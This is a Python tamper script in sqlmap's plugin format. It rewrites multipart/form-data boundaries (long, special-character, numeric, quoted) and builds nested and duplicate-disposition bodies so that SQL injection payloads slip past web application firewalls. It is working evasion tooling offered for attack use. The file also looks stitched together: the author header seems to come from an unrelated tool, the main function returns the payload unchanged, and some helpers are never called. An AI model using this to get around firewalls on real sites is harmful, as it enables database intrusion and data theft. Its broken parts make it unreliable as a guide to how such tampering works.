#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Manipulates multipart/form-data boundaries to confuse WAF parsers

    Requirement:
        * POST requests (will be converted to multipart/form-data)

    Tested against:
        * WAFs with strict boundary parsing
        * ModSecurity multipart rules
        * Cloudflare WAF
        * AWS WAF

    Notes:
        * Multipart boundaries can be manipulated in several ways:
          - Very long boundaries (>70 chars) may overflow buffers
          - Boundaries with special characters may confuse parsers
          - Nested multipart structures may bypass inspection
          - Duplicate boundaries may cause parser disagreements
        * Different parsers handle edge cases differently
        * Backend may be more lenient than WAF

    Reference:
        * RFC 2046 - Multipurpose Internet Mail Extensions (MIME)
        * https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics

    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    headers = kwargs.get("headers", {})
    
    # Generate a complex boundary that may confuse WAF parsers
    boundary_techniques = [
        generate_long_boundary,
        generate_special_char_boundary,
        generate_numeric_boundary,
        generate_quoted_boundary,
    ]
    
    # Select a random technique
    technique = random.choice(boundary_techniques)
    boundary = technique()
    
    # Set the Content-Type with the manipulated boundary
    headers["Content-Type"] = "multipart/form-data; boundary=%s" % boundary
    
    # Store boundary for potential use in request body transformation
    headers["X-Multipart-Boundary"] = boundary
    
    return payload


def generate_long_boundary():
    """
    Generates a very long boundary (>70 characters)
    Some parsers may truncate or fail on long boundaries
    """
    chars = string.ascii_letters + string.digits
    length = random.randint(100, 200)
    return ''.join(random.choice(chars) for _ in range(length))


def generate_special_char_boundary():
    """
    Generates a boundary with special characters that may confuse parsers
    RFC allows: DIGIT / ALPHA / "'" / "(" / ")" / "+" / "_" / "," / "-" / "." / "/" / ":" / "=" / "?"
    """
    # Mix of allowed special chars that may cause issues
    special_chars = "'()+_,-./:=?"
    base_chars = string.ascii_letters + string.digits
    
    boundary = ""
    for _ in range(40):
        if random.random() < 0.3:
            boundary += random.choice(special_chars)
        else:
            boundary += random.choice(base_chars)
    
    return boundary


def generate_numeric_boundary():
    """
    Generates a purely numeric boundary
    Some parsers may have issues with all-numeric boundaries
    """
    return ''.join(str(random.randint(0, 9)) for _ in range(50))


def generate_quoted_boundary():
    """
    Generates a boundary meant to be used with quotes
    Quoted boundaries can contain more characters
    """
    chars = string.ascii_letters + string.digits + " !#$%&'*+-.^_`|~"
    boundary = ''.join(random.choice(chars) for _ in range(60))
    return '"%s"' % boundary


def create_multipart_body(params, boundary):
    """
    Helper function to create a multipart/form-data body with the given boundary
    
    Args:
        params: Dictionary of parameter names and values
        boundary: The boundary string to use
        
    Returns:
        Formatted multipart body string
    """
    
    body_parts = []
    
    for name, value in params.items():
        part = []
        part.append("--%s" % boundary)
        part.append('Content-Disposition: form-data; name="%s"' % name)
        part.append("")
        part.append(str(value))
        body_parts.append("\r\n".join(part))
    
    body = "\r\n".join(body_parts)
    body += "\r\n--%s--\r\n" % boundary
    
    return body


def create_nested_multipart(payload, outer_boundary=None, inner_boundary=None):
    """
    Creates a nested multipart structure that may confuse WAF parsers
    
    Args:
        payload: The SQL injection payload
        outer_boundary: Boundary for outer multipart (generated if None)
        inner_boundary: Boundary for inner multipart (generated if None)
        
    Returns:
        Nested multipart body and Content-Type header value
    """
    
    if outer_boundary is None:
        outer_boundary = generate_long_boundary()
    if inner_boundary is None:
        inner_boundary = generate_special_char_boundary()
    
    # Inner multipart containing the payload
    inner_body = []
    inner_body.append("--%s" % inner_boundary)
    inner_body.append('Content-Disposition: form-data; name="id"')
    inner_body.append("")
    inner_body.append(payload)
    inner_body.append("--%s--" % inner_boundary)
    inner_content = "\r\n".join(inner_body)
    
    # Outer multipart containing the inner multipart
    outer_body = []
    outer_body.append("--%s" % outer_boundary)
    outer_body.append('Content-Disposition: form-data; name="data"')
    outer_body.append("Content-Type: multipart/form-data; boundary=%s" % inner_boundary)
    outer_body.append("")
    outer_body.append(inner_content)
    outer_body.append("--%s--" % outer_boundary)
    
    content_type = "multipart/form-data; boundary=%s" % outer_boundary
    
    return "\r\n".join(outer_body), content_type


def create_duplicate_boundary_body(payload, boundary=None):
    """
    Creates a multipart body with duplicate/conflicting boundaries
    to exploit parser differences
    
    Args:
        payload: The SQL injection payload
        boundary: The boundary to use (generated if None)
        
    Returns:
        Multipart body with duplicate boundaries
    """
    
    if boundary is None:
        boundary = generate_long_boundary()
    
    # Create body with duplicate Content-Disposition
    body = []
    body.append("--%s" % boundary)
    body.append('Content-Disposition: form-data; name="safe"')
    body.append('Content-Disposition: form-data; name="id"')  # Duplicate!
    body.append("")
    body.append(payload)
    body.append("--%s--" % boundary)
    
    return "\r\n".join(body)
